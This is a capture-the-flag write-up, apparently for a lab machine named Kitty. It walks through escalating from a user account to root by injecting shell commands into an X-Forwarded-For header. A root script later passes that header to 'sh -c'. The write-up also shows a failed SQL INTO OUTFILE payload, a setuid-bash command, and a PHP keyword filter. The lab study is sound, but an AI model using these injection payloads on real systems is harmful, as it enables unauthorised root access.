
FROM [[kitty_user]], we can find the following:

```bash
kitty@kitty:~$ cat /opt/log_checker.sh 
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

```bash
kitty@kitty:/var/www/development$ ls -la
total 32
drwxr-xr-x 2 root     root     4096 Nov 15  2022 .
drwxr-xr-x 4 root     root     4096 Nov 15  2022 ..
-rw-r--r-- 1 root     root      493 Nov 15  2022 config.php
-rw-r--r-- 1 root     root     2843 Nov 15  2022 index.php
-rw-r--r-- 1 www-data www-data    0 Jul 20 10:33 logged
-rw-r--r-- 1 root     root      223 Nov 15  2022 logout.php
-rw-r--r-- 1 root     root     5332 Nov 15  2022 register.php
-rw-r--r-- 1 root     root      860 Nov 15  2022 welcome.php
```


**SQL INJECTION**

since only www-data can write to here, let us modify the website. We had access to sql instructions, and at least in mysql there exists the following construct:

```sql
SELECT order_id,product_name,qty FROM orders
INTO OUTFILE '/tmp/orders.txt'
```

Let us use this to create an exploit, in the login, enter the following for the password

```sql
anything';SELECT+';+chmod+%2As+/bin/bash;+echo+"maybie"+'+INTO+OUTFILE+'/var/www/development/logged';
```

First, i discovered that certain privileges need to be granted:

```sql
mysql> SHOW GRANTS FOR 'kitty'@'localhost';
+--------------------------------------------------------------+
| Grants for kitty@localhost                                   |
+--------------------------------------------------------------+
| GRANT USAGE ON *.* TO `kitty`@`localhost`                    |
| GRANT ALL PRIVILEGES ON `devsite`.* TO `kitty`@`localhost`   |
| GRANT ALL PRIVILEGES ON `mywebsite`.* TO `kitty`@`localhost` |
+--------------------------------------------------------------+

mysql> GRANT FILE ON *.* TO 'kitty'@'localhost';
ERROR 1045 (28000): Access denied for user 'kitty'@'localhost' (using password: YES)

```

so we can't write to files :(

**PHP WEBSITE DEVELOPMENT**

while looking around the website we just cracked, i found the development site, which has the convenient code for us 

```php
// SQLMap
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
        if (preg_match( $evilword, $username )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        } elseif (preg_match( $evilword, $password )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        }
}
```

So we need www-data to execute this file with the HTTP_X_FORWARDED_FOR variable set up, we might be able to do this in the case that we are able to set up a server with root higher than /var/www/html or in /var/www/development.

### RECON FOR WWW-DATA

things owned by user

```bash
kitty@kitty:~$ find / -user www-data 2>/dev/null
/run/lock/apache2
/var/www/development/logged
/var/cache/apache2/mod_cache_disk
```

web app already being run by the user. 

- nothing in config.php
- nothing in index.php
- nothing in logout.php
- nothing in register.php
- nothing in welcome.php

searching directories inside of /var to see anything we might be able to modify:

```bash
kitty@kitty:/var$ find ./ -writable 2>/dev/null
./lib/php/sessions
./crash
./tmp
./lock # nothing in here
```

This part i had to look up, but it turns out that using the apache2 frontend you discover another instance running of apache

```bash
kitty@kitty:/var/lock/apache2$ apache2ctl -S

AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set the 'ServerName' directive globally to suppress this message
VirtualHost configuration:
127.0.0.1:8080         localhost (/etc/apache2/sites-enabled/dev_site.conf:2)
*:80                   127.0.1.1 (/etc/apache2/sites-enabled/000-default.conf:1)
ServerRoot: "/etc/apache2"
Main DocumentRoot: "/var/www/html"
Main ErrorLog: "/var/log/apache2/error.log"
Mutex watchdog-callback: using_defaults
Mutex default: dir="/var/run/apache2/" mechanism=default 
Mutex mpm-accept: using_defaults
PidFile: "/var/run/apache2/apache2.pid"
Define: DUMP_VHOSTS
Define: DUMP_RUN_CFG
User: name="www-data" id=33 not_used
Group: name="www-data" id=33 not_used

```

```bash
kitty@kitty:/var/lock/apache2$ cat /etc/apache2/sites-enabled/dev_site.conf
Listen 127.0.0.1:8080
<VirtualHost 127.0.0.1:8080>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/development

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

So there is a sever that will only listen to addresses from localhost, so we can simply do the following 

```bash
kitty@kitty:/var/www/development$ curl localhost:8080 -X POST -H "X-Forwarded-For: ; chmod +s /bin/bash ; echo this" -d "username=0xaa&password=nothing"
```

after this simply execute 

```bash
/bin/bash -p 
```